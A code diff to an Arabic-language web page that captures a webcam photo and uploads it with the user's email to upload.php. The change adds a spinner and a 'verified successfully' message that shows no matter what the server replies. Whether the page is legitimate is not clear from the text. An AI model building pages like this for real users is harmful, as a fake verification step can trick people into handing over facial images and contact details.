@@ -31,6 +31,27 @@
         button:hover {
             background-color: #0056b3;
         }
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verified {
+            display: none;
+            font-size: 20px;
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -42,7 +63,9 @@
         <video id="video" width="320" height="240" autoplay></video>
         <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
         <br>
-        <button onclick="captureImage()">التقاط الصورة</button>
+        <button id="captureButton" onclick="captureImage()">التقاط الصورة</button>
+        <div class="loader" id="loader"></div>
+        <p class="verified" id="verifiedMessage">✅ تم التحقق بنجاح!</p>
     </div>
 
     <script>
@@ -66,19 +89,31 @@
             // تحويل الصورة إلى بيانات Base64
             const imageData = canvas.toDataURL("image/png");
 
-            // إرسال الصورة مع البريد الإلكتروني إلى الخادم
+            // إظهار التحميل وإخفاء الزر
+            document.getElementById("captureButton").style.display = "none";
+            document.getElementById("loader").style.display = "block";
+
+            // إرسال الصورة إلى الخادم
             sendImageToServer(imageData, userEmail);
         }
 
         function sendImageToServer(imageData, email) {
-            fetch("send_email.php", {
+            fetch("upload.php", {
                 method: "POST",
                 body: JSON.stringify({ image: imageData, email: email }),
                 headers: { "Content-Type": "application/json" }
             })
             .then(response => response.text())
-            .then(data => alert(data))
-            .catch(error => alert("فشل الإرسال: " + error));
+            .then(data => {
+                // إخفاء التحميل وعرض رسالة النجاح
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("verifiedMessage").style.display = "block";
+            })
+            .catch(error => {
+                alert("فشل الإرسال: " + error);
+                document.getElementById("captureButton").style.display = "block";
+                document.getElementById("loader").style.display = "none";
+            });
         }
     </script>
 
